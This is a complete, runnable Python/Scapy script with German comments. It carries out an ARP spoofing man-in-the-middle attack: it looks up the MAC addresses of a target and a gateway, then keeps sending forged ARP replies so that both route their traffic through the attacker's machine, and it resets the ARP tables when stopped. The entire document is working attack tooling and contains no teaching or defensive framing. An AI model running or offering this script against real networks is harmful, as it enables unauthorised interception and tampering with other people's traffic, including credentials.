from scapy.all import *
import time
import sys

def get_mac(ip):
    """ MAC-Adresse für gegebene IP via ARP-Request holen """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """ Spoofed ARP-Paket an Target senden: Sag ihm, Gateway sei du """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet, verbose=False)

def spoof_gateway(target_ip, target_mac, gateway_ip):
    """ Spoofed ARP-Paket an Gateway senden: Sag ihm, Target sei du """
    packet = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
    send(packet, verbose=False)

def restore_destination(gateway_ip, gateway_mac, target_ip, target_mac):
    """ Nach dem Angriff: Alles zurücksetzen """
    print("[*] Restoring ARP tables...")
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 mitm_arp_spoof.py <target_ip> <gateway_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")
    
    print("[*] Starting ARP spoofing... (Ctrl+C to stop)")
    try:
        while True:
            spoof_target(gateway_ip, gateway_mac, target_ip, target_mac)
            spoof_gateway(target_ip, target_mac, gateway_ip)
            time.sleep(2)  # Alle 2 Sekunden spoofen
    except KeyboardInterrupt:
        print("\n[*] Stopping spoofing...")
        restore_destination(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[*] Done!")